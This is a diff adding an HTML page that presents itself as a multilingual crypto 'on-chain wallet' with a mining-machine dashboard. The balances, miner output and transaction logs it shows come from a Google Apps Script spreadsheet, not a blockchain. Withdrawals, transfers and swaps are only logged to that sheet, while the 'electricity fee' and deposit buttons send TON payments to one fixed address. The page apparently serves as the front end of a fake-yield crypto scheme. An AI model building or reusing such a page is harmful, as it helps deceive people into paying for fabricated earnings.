@@ -1,0 +1,487 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>链上钱包 | On-chain Wallet</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <script defer src="https://unpkg.com/alpinejs@3.x.x/dist/cdn.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/tsparticles-confetti@2.12.0/tsparticles.confetti.bundle.min.js"></script>
+
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@500;700&display=swap');
+        body { background: linear-gradient(180deg, #e0f2fe 0%, #ffffff 100%); min-height: 100vh; overflow-x: hidden; }
+        .tech-title {
+            font-family: 'Orbitron', sans-serif;
+            background: linear-gradient(90deg, #60a5fa, #a855f7, #ec4899);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            filter: drop-shadow(2px 2px 2px rgba(0,0,0,0.1));
+        }
+        .glass-card { background: rgba(255, 255, 255, 0.85); backdrop-filter: blur(12px); border: 1px solid rgba(255, 255, 255, 0.5); border-radius: 1.25rem; }
+        #tsparticles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: -1; }
+        .blur-text { filter: blur(5px); user-select: none; }
+        [x-cloak] { display: none !important; }
+        select { appearance: none; }
+    </style>
+</head>
+<body x-data="walletApp()" x-init="init()">
+    <div id="tsparticles"></div>
+
+    <header class="flex justify-between items-center p-4 sticky top-0 z-50 glass-card mx-2 mt-2 shadow-sm">
+        <div class="flex items-center space-x-2 truncate">
+            <img src="https://www.528btc.com/d/file/2024-05-13/b70f4e667e54e1e75e758a01f6ee0bbf.jpg" class="w-9 h-9 rounded-full shadow-inner" alt="logo">
+            <h1 class="tech-title text-base sm:text-lg font-bold italic" x-text="t('title')"></h1>
+        </div>
+        <select x-model="lang" @change="changeLang" class="bg-blue-600 text-yellow-300 text-xs font-bold rounded-full px-4 py-2 outline-none border-none shadow-lg cursor-pointer">
+            <template x-for="(name, code) in languages" :key="code">
+                <option :value="code" x-text="name" class="bg-white text-blue-900"></option>
+            </template>
+        </select>
+    </header>
+
+    <main class="p-3 max-w-md mx-auto space-y-5">
+        
+        <div class="glass-card p-5 space-y-4 shadow-xl border-b-2 border-indigo-200">
+            <template x-if="!isLoggedIn">
+                <input type="text" x-model="walletAddress" :placeholder="t('inputPlaceholder')" 
+                       class="w-full p-3 rounded-xl border border-blue-100 bg-white focus:ring-2 focus:ring-blue-400 outline-none text-sm transition-all">
+            </template>
+            <template x-if="isLoggedIn">
+                <div class="flex items-center justify-between bg-indigo-50 p-3 rounded-xl border border-indigo-100">
+                    <span class="text-xs font-mono text-indigo-600 font-bold" x-text="shortenAddress(walletAddress)"></span>
+                    <span class="text-[10px] bg-green-500 text-white px-2 py-0.5 rounded-full font-bold">Online</span>
+                </div>
+            </template>
+            
+            <div class="flex gap-2">
+                <button @click="login" class="flex-1 bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-3 rounded-xl font-bold shadow-lg active:scale-95 transition flex items-center justify-center" :disabled="loading">
+                    <span x-show="loading" class="mr-2 animate-spin">🌀</span>
+                    <span x-text="isLoggedIn ? t('refreshData') : t('connectBtn')"></span>
+                </button>
+                <button x-show="isLoggedIn" @click="logout" class="px-4 bg-red-50 text-red-500 rounded-xl font-bold border border-red-100" x-text="t('logout')"></button>
+            </div>
+        </div>
+
+        <div class="glass-card p-4 shadow-md border-t-4 border-indigo-400">
+            <h3 class="font-bold text-indigo-900 mb-4 flex items-center">
+                <span class="mr-2">⚡</span> <span x-text="t('minerModule')"></span>
+            </h3>
+            
+            <div class="space-y-4">
+                <div class="grid grid-cols-4 gap-2">
+                    <template x-if="!isLoggedIn || userData.miners.length === 0">
+                        <template x-for="i in 4"><div class="h-16 bg-gray-100/50 rounded-xl flex items-center justify-center text-gray-300 text-xs">OFF</div></template>
+                    </template>
+                    <template x-if="isLoggedIn">
+                        <template x-for="m in userData.miners">
+                            <div class="text-center p-2 bg-white rounded-xl border border-blue-50 shadow-sm">
+                                <div class="text-2xl mb-1">🛰️</div>
+                                <div class="text-[9px] text-gray-500 flex justify-center items-center">
+                                    <span x-text="m.id"></span>
+                                    <button @click="copyText(m.id)" class="ml-1 text-blue-400">📋</button>
+                                </div>
+                                <div class="text-[9px] font-bold text-orange-500 mt-1" x-text="m.days + ' Days'"></div>
+                            </div>
+                        </template>
+                    </template>
+                </div>
+
+                <div class="bg-blue-50/50 p-3 rounded-xl">
+                    <p class="text-[11px] text-blue-800 mb-2 leading-tight font-medium" x-text="t('rechargeTip')"></p>
+                    <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton?jetton=EQCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_sDs&amount=35000000" 
+                       class="block w-full text-center bg-white text-blue-600 py-2.5 rounded-lg text-xs font-bold border border-blue-100 shadow-sm" x-text="t('rechargeBtn')"></a>
+                </div>
+
+                <div class="grid grid-cols-2 gap-3">
+                    <div class="bg-indigo-50/50 p-3 rounded-xl border border-indigo-100">
+                        <p class="text-[10px] text-gray-400 mb-1" x-text="t('dailyOutput')"></p>
+                        <p class="font-bold text-sm text-indigo-700 flex items-center">
+                            <img src="https://via.placeholder.com/20?text=AIT" class="mr-1 w-4 h-4 rounded-full">
+                            <span :class="!isLoggedIn && 'blur-text'" x-text="isLoggedIn ? userData.dailyOutput + ' AIT' : '****'"></span>
+                        </p>
+                    </div>
+                    <div class="bg-purple-50/50 p-3 rounded-xl border border-purple-100">
+                        <p class="text-[10px] text-gray-400 mb-1" x-text="t('lockedAmount')"></p>
+                        <p class="font-bold text-sm text-purple-700 flex items-center">
+                            <img src="https://via.placeholder.com/20?text=AIT" class="mr-1 w-4 h-4 rounded-full">
+                            <span :class="!isLoggedIn && 'blur-text'" x-text="isLoggedIn ? userData.lockedAmount + ' AIT' : '****'"></span>
+                        </p>
+                    </div>
+                </div>
+
+                <div class="grid grid-cols-2 gap-2">
+                    <button @click="openModal('merge')" class="bg-indigo-600 text-white py-2.5 rounded-lg text-xs font-bold" x-text="t('mergeMiner')"></button>
+                    <button @click="openModal('transferMiner')" class="bg-indigo-100 text-indigo-700 py-2.5 rounded-lg text-xs font-bold" x-text="t('transferMiner')"></button>
+                </div>
+            </div>
+        </div>
+
+        <div class="glass-card p-4 shadow-md">
+            <div class="text-center py-4 mb-4 bg-gradient-to-b from-transparent to-blue-50/30 rounded-2xl">
+                <p class="text-[11px] text-gray-400 font-bold uppercase tracking-widest" x-text="t('totalAssets')"></p>
+                <p class="text-3xl font-bold text-gray-800 tracking-tight" :class="!isLoggedIn && 'blur-text'" x-text="isLoggedIn ? '$ ' + userData.totalValue : '$ ****'"></p>
+            </div>
+
+            <div class="space-y-1">
+                <template x-for="coin in coins">
+                    <div class="flex items-center justify-between p-3 hover:bg-white rounded-xl transition cursor-default group">
+                        <div class="flex items-center space-x-3">
+                            <img :src="coin.logo" class="w-10 h-10 rounded-full shadow-sm bg-gray-50">
+                            <div>
+                                <p class="font-bold text-gray-800 text-sm" x-text="coin.name"></p>
+                                <p class="text-[10px] text-gray-400" x-text="'$'+coin.price"></p>
+                            </div>
+                        </div>
+                        <div class="text-right">
+                            <p class="font-bold text-gray-800 text-sm" :class="!isLoggedIn && 'blur-text'" x-text="isLoggedIn ? coin.balance : '****'"></p>
+                            <p class="text-[10px] text-gray-500 font-medium" :class="!isLoggedIn && 'blur-text'" x-text="isLoggedIn ? '≈ $'+(coin.balance * coin.price).toLocaleString() : '****'"></p>
+                        </div>
+                    </div>
+                </template>
+            </div>
+
+            <div class="grid grid-cols-3 gap-2 mt-6">
+                <button @click="openModal('withdraw')" class="bg-blue-600 text-white py-2.5 rounded-xl text-xs font-bold" x-text="t('withdraw')"></button>
+                <a href="https://app.tonkeeper.com/transfer/aigoodtalk.ton" class="bg-green-600 text-white py-2.5 rounded-xl text-xs font-bold text-center flex items-center justify-center" x-text="t('deposit')"></a>
+                <button @click="openModal('transfer')" class="bg-orange-500 text-white py-2.5 rounded-xl text-xs font-bold" x-text="t('transfer')"></button>
+            </div>
+        </div>
+
+        <div class="glass-card p-4 shadow-md bg-indigo-900 text-white">
+            <h3 class="font-bold text-sm mb-4 flex items-center">
+                <span class="mr-2">🔄</span> <span x-text="t('swapTitle')"></span>
+            </h3>
+            <div class="space-y-3">
+                <select x-model="swap.pair" class="w-full p-3 border-none rounded-xl text-sm bg-indigo-800 text-white outline-none">
+                    <option value="AIT-USDT">AIT → USDT (TON)</option>
+                    <option value="ACT-USDT">ACT → USDT (TON)</option>
+                    <option value="AIT-ACT">AIT → ACT</option>
+                </select>
+                <input type="number" x-model="swap.amount" :placeholder="t('inputAmount')" class="w-full p-3 rounded-xl text-sm bg-indigo-800 text-white placeholder-indigo-400 border-none outline-none">
+                <div class="text-[10px] text-indigo-300 px-1 font-medium" x-text="t('gasTip')"></div>
+                <button @click="submitSwap" class="w-full bg-gradient-to-r from-pink-500 to-purple-600 text-white py-3 rounded-xl font-bold text-sm shadow-lg shadow-indigo-900/50" x-text="t('executeSwap')"></button>
+            </div>
+        </div>
+
+        <div class="glass-card p-4 shadow-md overflow-hidden min-h-[150px]">
+            <h3 class="font-bold text-sm mb-3 text-gray-700" x-text="t('records')"></h3>
+            <div class="overflow-x-auto">
+                <template x-if="!isLoggedIn || logs.length === 0">
+                    <div class="flex flex-col items-center justify-center py-6 text-gray-400">
+                        <span class="text-2xl mb-2">📁</span>
+                        <p class="text-[10px]" x-text="isLoggedIn ? 'No records found' : t('loginToView')"></p>
+                    </div>
+                </template>
+                <template x-if="isLoggedIn && logs.length > 0">
+                    <table class="w-full text-[10px] text-left">
+                        <thead class="bg-gray-50 text-gray-400 uppercase">
+                            <tr>
+                                <th class="p-2" x-text="t('date')"></th>
+                                <th class="p-2" x-text="t('type')"></th>
+                                <th class="p-2" x-text="t('amount')"></th>
+                                <th class="p-2" x-text="t('status')"></th>
+                            </tr>
+                        </thead>
+                        <tbody class="divide-y divide-gray-50">
+                            <template x-for="log in logs">
+                                <tr>
+                                    <td class="p-2 whitespace-nowrap text-gray-500" x-text="log.date"></td>
+                                    <td class="p-2 font-medium" x-text="log.type"></td>
+                                    <td class="p-2 font-bold" x-text="log.amount"></td>
+                                    <td class="p-2 font-bold" :class="log.status === 'Success' || log.status === '成功' ? 'text-green-500' : 'text-orange-500'" x-text="log.status"></td>
+                                </tr>
+                            </template>
+                        </tbody>
+                    </table>
+                </template>
+            </div>
+        </div>
+
+        <footer class="text-center text-[10px] text-gray-400 py-8 border-t border-gray-100">
+            <p>© 2026 AI Chain Wallet Technology. All Rights Reserved.</p>
+        </footer>
+    </main>
+
+    <div x-show="modal.show" x-cloak class="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-slate-900/60 backdrop-blur-sm">
+        <div class="bg-white rounded-3xl w-full max-w-xs p-6 shadow-2xl relative">
+            <div class="flex justify-between items-center mb-6">
+                <h3 class="font-extrabold text-gray-800" x-text="modal.title"></h3>
+                <button @click="modal.show = false" class="bg-gray-100 p-1 rounded-full text-gray-400 hover:text-red-500">✕</button>
+            </div>
+            
+            <div class="space-y-4">
+                <template x-if="['withdraw', 'transfer'].includes(modal.type)">
+                    <div class="space-y-1">
+                        <label class="text-[10px] text-gray-400 font-bold ml-1">SELECT TOKEN</label>
+                        <select x-model="modal.coin" class="w-full p-3 bg-gray-50 border-none rounded-xl text-sm outline-none ring-1 ring-gray-100 focus:ring-2 focus:ring-blue-500">
+                            <template x-for="coin in coins">
+                                <option :value="coin.name" x-text="coin.name"></option>
+                            </template>
+                        </select>
+                    </div>
+                </template>
+
+                <div class="space-y-1">
+                    <label class="text-[10px] text-gray-400 font-bold ml-1">AMOUNT</label>
+                    <input type="number" x-model="modal.amount" placeholder="0.00" class="w-full p-3 bg-gray-50 border-none rounded-xl text-sm outline-none ring-1 ring-gray-100 focus:ring-2 focus:ring-blue-500">
+                </div>
+                
+                <template x-if="modal.type === 'transfer' || modal.type === 'transferMiner'">
+                    <div class="space-y-1">
+                        <label class="text-[10px] text-gray-400 font-bold ml-1">RECIPIENT ADDRESS</label>
+                        <input type="text" x-model="modal.target" :placeholder="t('targetAddr')" class="w-full p-3 bg-gray-50 border-none rounded-xl text-sm outline-none ring-1 ring-gray-100 focus:ring-2 focus:ring-blue-500">
+                    </div>
+                </template>
+
+                <div class="p-3 bg-blue-50 rounded-xl border border-blue-100">
+                    <p class="text-[10px] text-blue-600 font-medium leading-relaxed" x-text="t('gasTip')"></p>
+                </div>
+
+                <button @click="handleModalSubmit" class="w-full bg-blue-600 text-white py-4 rounded-2xl font-bold shadow-lg shadow-blue-100 transition active:scale-95" x-text="t('confirm')"></button>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        function walletApp() {
+            return {
+                lang: 'zh-CN',
+                isLoggedIn: false,
+                loading: false,
+                walletAddress: '',
+                swap: { pair: 'AIT-USDT', amount: '' },
+                languages: {
+                    'zh-CN': '简体中文', 'zh-TW': '繁體中文', 'ja': '日本語', 'ko': '한국어',
+                    'ms': 'Melayu', 'ru': 'Русский', 'fr': 'Français', 'de': 'Deutsch', 'es': 'Español'
+                },
+                translations: {
+                    'zh-CN': {
+                        title: '链上钱包', inputPlaceholder: '在此输入您的钱包地址', connectBtn: '连接钱包', refreshData: '更新数据', logout: '退出',
+                        minerModule: '矿机工作台', basicMiner: '原始矿机 (A-Type)', rechargeTip: '请充费时备注您的矿机编号', rechargeBtn: '电费充值',
+                        dailyOutput: '每日产币', lockedAmount: '锁仓数量', mergeMiner: '合成节点矿机', transferMiner: '节点矿机转让',
+                        totalAssets: '钱包总资产 (USD)', withdraw: '提币', deposit: '充值', transfer: '转账', swapTitle: '闪电兑换',
+                        executeSwap: '立即兑换', records: '交易记录', date: '时间', type: '操作', amount: '数额', status: '状态',
+                        inputAmount: '输入数量 (10.56)', gasTip: 'Gas费用 (0.1 TON)，提交后十分钟内处理', confirm: '确认操作',
+                        targetAddr: '请输入接收者钱包地址', success: '提交成功！', loginToView: '请先连接钱包查看记录'
+                    },
+                    'zh-TW': {
+                        title: '鏈上錢包', inputPlaceholder: '在此輸入您的錢包地址', connectBtn: '連接錢包', refreshData: '更新數據', logout: '退出',
+                        minerModule: '礦機工作臺', basicMiner: '原始礦機 (A-Type)', rechargeTip: '請充費時備註您的礦機編號', rechargeBtn: '電費充值',
+                        dailyOutput: '每日產幣', lockedAmount: '鎖倉數量', mergeMiner: '合成節點礦機', transferMiner: '節點礦機轉讓',
+                        totalAssets: '錢包總資產 (USD)', withdraw: '提幣', deposit: '充值', transfer: '轉賬', swapTitle: '閃電兌換',
+                        executeSwap: '立即兌換', records: '交易記錄', date: '時間', type: '操作', amount: '數額', status: '狀態',
+                        inputAmount: '輸入數量 (10.56)', gasTip: 'Gas費用 (0.1 TON)，提交後十分鐘內處理', confirm: '確認操作',
+                        targetAddr: '請輸入接收者錢包地址', success: '提交成功！', loginToView: '請先連接錢包查看記錄'
+                    },
+                    'ja': {
+                        title: 'オンチェーン財布', inputPlaceholder: 'ウォレットアドレスを入力', connectBtn: '連携', refreshData: 'データ更新', logout: 'ログアウト',
+                        minerModule: 'マイナーパネル', basicMiner: '基本マイナー', rechargeTip: 'リチャージ時にマイナーIDを記入', rechargeBtn: '電気代リチャージ',
+                        dailyOutput: '日次生産', lockedAmount: 'ロック量', mergeMiner: 'マイナー合成', transferMiner: 'マイナー譲渡',
+                        totalAssets: '総資産 (USD)', withdraw: '出金', deposit: '入金', transfer: '送金', swapTitle: 'スワップ',
+                        executeSwap: '交換する', records: '履歴', date: '日付', type: 'タイプ', amount: '数量', status: '状態',
+                        inputAmount: '数量 (例: 10.56)', gasTip: 'ガス代 (0.1 TON)、10分以内に完了', confirm: '確認送信',
+                        targetAddr: '受取人アドレス', success: '送信完了！', loginToView: '連携して記録を表示'
+                    },
+                    'ko': {
+                        title: '온체인 지갑', inputPlaceholder: '지갑 주소를 입력하세요', connectBtn: '지갑 연결', refreshData: '데이터 갱신', logout: '로그아웃',
+                        minerModule: '채굴기 대시보드', basicMiner: '기본 채굴기', rechargeTip: '충전 시 채굴기 번호를 메모하세요', rechargeBtn: '전기료 충전',
+                        dailyOutput: '일일 생산량', lockedAmount: '잠긴 수량', mergeMiner: '채굴기 합성', transferMiner: '채굴기 양도',
+                        totalAssets: '총 자산 (USD)', withdraw: '출금', deposit: '입금', transfer: '이체', swapTitle: '스왑',
+                        executeSwap: '즉시 교환', records: '거래 기록', date: '날짜', type: '유형', amount: '금액', status: '상태',
+                        inputAmount: '수량 입력 (예: 10.56)', gasTip: '수수료 (0.1 TON), 10분 내 처리', confirm: '작업 확인',
+                        targetAddr: '수신자 지갑 주소', success: '제출 성공!', loginToView: '지갑 연결 후 기록 확인'
+                    },
+                    'ms': {
+                        title: 'Dompet On-chain', inputPlaceholder: 'Masukkan alamat dompet', connectBtn: 'Sambung', refreshData: 'Kemaskini', logout: 'Keluar',
+                        minerModule: 'Panel Pelombong', basicMiner: 'Pelombong Asal', rechargeTip: 'Nota nombor pelombong semasa mengecas', rechargeBtn: 'Tambah Nilai',
+                        dailyOutput: 'Hasil Harian', lockedAmount: 'Jumlah Terkunci', mergeMiner: 'Gabung Pelombong', transferMiner: 'Pindah Pelombong',
+                        totalAssets: 'Jumlah Aset', withdraw: 'Tarik', deposit: 'Deposit', transfer: 'Pindah', swapTitle: 'Tukar',
+                        executeSwap: 'Tukar Sekarang', records: 'Rekod', date: 'Tarikh', type: 'Jenis', amount: 'Jumlah', status: 'Status',
+                        inputAmount: 'Masukkan jumlah', gasTip: 'Kos Gas (0.1 TON), dalam 10 min', confirm: 'Sahkan',
+                        targetAddr: 'Alamat penerima', success: 'Berjaya!', loginToView: 'Sambung dompet untuk rekod'
+                    },
+                    'ru': {
+                        title: 'On-chain Кошелек', inputPlaceholder: 'Введите адрес кошелька', connectBtn: 'Подключить', refreshData: 'Обновить', logout: 'Выйти',
+                        minerModule: 'Панель майнера', basicMiner: 'Базовый майнер', rechargeTip: 'Указывайте ID майнера при оплате', rechargeBtn: 'Оплата эл-энергии',
+                        dailyOutput: 'Доход в день', lockedAmount: 'Заблокировано', mergeMiner: 'Синтез узла', transferMiner: 'Передача майнера',
+                        totalAssets: 'Общие активы', withdraw: 'Вывод', deposit: 'Депозит', transfer: 'Перевод', swapTitle: 'Обмен',
+                        executeSwap: 'Обменять', records: 'История', date: 'Дата', type: 'Тип', amount: 'Кол-во', status: 'Статус',
+                        inputAmount: 'Введите кол-во', gasTip: 'Газ (0.1 TON), 10 мин', confirm: 'Подтвердить',
+                        targetAddr: 'Адрес получателя', success: 'Успешно!', loginToView: 'Подключитесь для просмотра'
+                    },
+                    'fr': {
+                        title: 'Portefeuille On-chain', inputPlaceholder: 'Entrez l\'adresse', connectBtn: 'Connecter', refreshData: 'Actualiser', logout: 'Quitter',
+                        minerModule: 'Tableau de bord', basicMiner: 'Mineur de base', rechargeTip: 'Notez le numéro du mineur', rechargeBtn: 'Recharger',
+                        dailyOutput: 'Production/j', lockedAmount: 'Bloqué', mergeMiner: 'Fusionner', transferMiner: 'Transférer',
+                        totalAssets: 'Total actifs', withdraw: 'Retirer', deposit: 'Dépôt', transfer: 'Transférer', swapTitle: 'Échange',
+                        executeSwap: 'Échanger', records: 'Historique', date: 'Date', type: 'Type', amount: 'Montant', status: 'Statut',
+                        inputAmount: 'Entrer montant', gasTip: 'Frais (0.1 TON), 10 min', confirm: 'Confirmer',
+                        targetAddr: 'Adresse destinataire', success: 'Succès!', loginToView: 'Connectez-vous pour voir'
+                    },
+                    'de': {
+                        title: 'On-chain Wallet', inputPlaceholder: 'Adresse eingeben', connectBtn: 'Verbinden', refreshData: 'Aktualisieren', logout: 'Logout',
+                        minerModule: 'Miner-Panel', basicMiner: 'Basis-Miner', rechargeTip: 'Miner-ID bei Zahlung angeben', rechargeBtn: 'Aufladen',
+                        dailyOutput: 'Ertrag/Tag', lockedAmount: 'Gesperrt', mergeMiner: 'Fusionieren', transferMiner: 'Übertragen',
+                        totalAssets: 'Gesamtvermögen', withdraw: 'Auszahlen', deposit: 'Einzahlen', transfer: 'Senden', swapTitle: 'Tausch',
+                        executeSwap: 'Tauschen', records: 'Verlauf', date: 'Datum', type: 'Typ', amount: 'Menge', status: 'Status',
+                        inputAmount: 'Menge (z.B. 10.56)', gasTip: 'Gas (0.1 TON), 10 Min', confirm: 'Bestätigen',
+                        targetAddr: 'Empfängeradresse', success: 'Erfolg!', loginToView: 'Anmelden für Verlauf'
+                    },
+                    'es': {
+                        title: 'Billetera On-chain', inputPlaceholder: 'Dirección de billetera', connectBtn: 'Conectar', refreshData: 'Actualizar', logout: 'Salir',
+                        minerModule: 'Panel Minería', basicMiner: 'Minero Base', rechargeTip: 'Indique ID del minero', rechargeBtn: 'Recargar',
+                        dailyOutput: 'Producción', lockedAmount: 'Bloqueado', mergeMiner: 'Fusionar', transferMiner: 'Transferir',
+                        totalAssets: 'Activos Totales', withdraw: 'Retirar', deposit: 'Depósito', transfer: 'Transferir', swapTitle: 'Swap',
+                        executeSwap: 'Intercambiar', records: 'Registros', date: 'Fecha', type: 'Tipo', amount: 'Cantidad', status: 'Estado',
+                        inputAmount: 'Cantidad (ej: 10.56)', gasTip: 'Gas (0.1 TON), 10 min', confirm: 'Confirmar',
+                        targetAddr: 'Dirección receptor', success: '¡Éxito!', loginToView: 'Conectar para ver registros'
+                    }
+                },
+                // 数据状态
+                userData: { miners: [], totalValue: '0.00', dailyOutput: '0', lockedAmount: '0' },
+                coins: [
+                    { name: 'AIT', balance: 0, price: 0.1, logo: 'https://pbs.twimg.com/media/G-DbAlZbMAAgM4X?format=png&name=240x240' },
+                    { name: 'ACT', balance: 0, price: 1.15, logo: 'https://pbs.twimg.com/media/G-DdXH_aAAExvdl?format=png&name=240x240' },
+                    { name: 'USDD', balance: 0, price: 1.00, logo: 'https://pbs.twimg.com/media/G-DdV2GbEAA1x4q?format=png&name=240x240' },
+                    { name: 'USDT', balance: 0, price: 1.00, logo: 'https://www.coinmetro.com/_next/static/media/USDT.e5b6b9e8.svg' },
+                    { name: 'TON', balance: 0, price: 5.38, logo: 'https://asset-metadata-service-production.s3.amazonaws.com/asset_icons/46db595e47fca18285c42eaa720fd4cdf3cc4940e1490ec07c77d21f2cf961cf.png' }
+                ],
+                logs: [],
+                modal: { show: false, type: '', title: '', amount: '', target: '', coin: 'AIT' },
+
+                init() {
+                    this.initParticles();
+                    this.detectLanguage();
+                    const saved = localStorage.getItem('onchain_wallet_addr');
+                    if(saved) {
+                        this.walletAddress = saved;
+                        this.login();
+                    }
+                },
+                t(key) { return (this.translations[this.lang] && this.translations[this.lang][key]) || this.translations['zh-CN'][key]; },
+                detectLanguage() {
+                    const nav = navigator.language.toLowerCase();
+                    const map = {'tw':'zh-TW','hk':'zh-TW','zh':'zh-CN','ja':'ja','ko':'ko','ru':'ru','ms':'ms','fr':'fr','de':'de','es':'es'};
+                    for(let key in map) { if(nav.includes(key)) { this.lang = map[key]; break; } }
+                },
+                changeLang() { /* 切换语言触发逻辑 */ },
+                
+                // 表格交互核心函数
+                async login() {
+                    if(!this.walletAddress || this.walletAddress.length < 5) return alert("Invalid Address");
+                    this.loading = true;
+                    
+                    const API_URL = 'https://script.google.com/macros/s/AKfycbw_WQtan3RjVNDMAc5_2PJiJvxyzaLn23HvMzcCLIM5beeMEXKwniIDE8ZVubh2jxn8bw/exec'; // <--- 重要：填入你的脚本URL
+                    
+                    try {
+                        const response = await fetch(`${API_URL}?address=${this.walletAddress}`);
+                        const data = await response.json();
+                        
+                        if(data.user && data.user.total !== undefined) {
+                            // 绑定表格数据到 UI
+                            this.userData.totalValue = data.user.total;
+                            this.userData.dailyOutput = data.user.daily;
+                            this.userData.lockedAmount = data.user.locked;
+                            this.userData.miners = data.miners || [];
+                            
+                            // 更新代币余额
+                            this.coins.forEach(c => {
+                                if(data.user.balances && data.user.balances[c.name] !== undefined) {
+                                    c.balance = data.user.balances[c.name];
+                                }
+                            });
+                            
+                            // 更新交易记录
+                            this.logs = data.logs || [];
+                            
+                            this.isLoggedIn = true;
+                            localStorage.setItem('onchain_wallet_addr', this.walletAddress);
+                        } else {
+                            alert("Address not found in database.");
+                        }
+                    } catch (e) {
+                        console.error(e);
+                        alert("Connection failed. Check your API URL.");
+                    } finally {
+                        this.loading = false;
+                    }
+                },
+                
+                logout() {
+                    this.isLoggedIn = false;
+                    this.walletAddress = '';
+                    this.userData = { miners: [], totalValue: '0.00', dailyOutput: '0', lockedAmount: '0' };
+                    this.coins.forEach(c => c.balance = 0);
+                    this.logs = [];
+                    localStorage.removeItem('onchain_wallet_addr');
+                },
+
+                shortenAddress(addr) { return addr.slice(0,6) + '...' + addr.slice(-4); },
+                
+                openModal(type) {
+                    if(!this.isLoggedIn) return alert("Please connect wallet first");
+                    this.modal.type = type;
+                    this.modal.title = this.t(type);
+                    this.modal.show = true;
+                },
+
+                async handleModalSubmit() {
+                    if(!this.modal.amount) return alert("Enter amount");
+                    const payload = {
+                        user: this.walletAddress,
+                        action: this.modal.type,
+                        amount: this.modal.amount,
+                        coin: this.modal.coin,
+                        target: this.modal.target,
+                        timestamp: new Date().toLocaleString()
+                    };
+                    await this.postData(payload);
+                    this.modal.show = false;
+                    alert(this.t('success'));
+                },
+
+                async submitSwap() {
+                    if(!this.isLoggedIn) return alert("Please connect wallet first");
+                    if(!this.swap.amount) return alert("Enter amount");
+                    await this.postData({
+                        user: this.walletAddress,
+                        action: 'SWAP',
+                        pair: this.swap.pair,
+                        amount: this.swap.amount,
+                        timestamp: new Date().toLocaleString()
+                    });
+                    alert(this.t('success'));
+                },
+
+                async postData(data) {
+                    const API_URL = 'https://script.google.com/macros/s/AKfycbw_WQtan3RjVNDMAc5_2PJiJvxyzaLn23HvMzcCLIM5beeMEXKwniIDE8ZVubh2jxn8bw/exec'; // <--- 重要：填入你的脚本URL
+                    try {
+                        await fetch(API_URL, {
+                            method: 'POST',
+                            mode: 'no-cors',
+                            body: JSON.stringify(data)
+                        });
+                    } catch(e){ console.error(e); }
+                },
+
+                copyText(txt) {
+                    navigator.clipboard.writeText(txt);
+                    alert("ID Copied: " + txt);
+                },
+
+                initParticles() {
+                    tsParticles.load("tsparticles", {
+                        particles: {
+                            number: { value: 25 },
+                            color: { value: "#6366f1" },
+                            links: { enable: true, color: "#6366f1", opacity: 0.15 },
+                            move: { enable: true, speed: 0.8 }
+                        }
+                    });
+                }
+            }
+        }
+    </script>
+</body>
+</html>
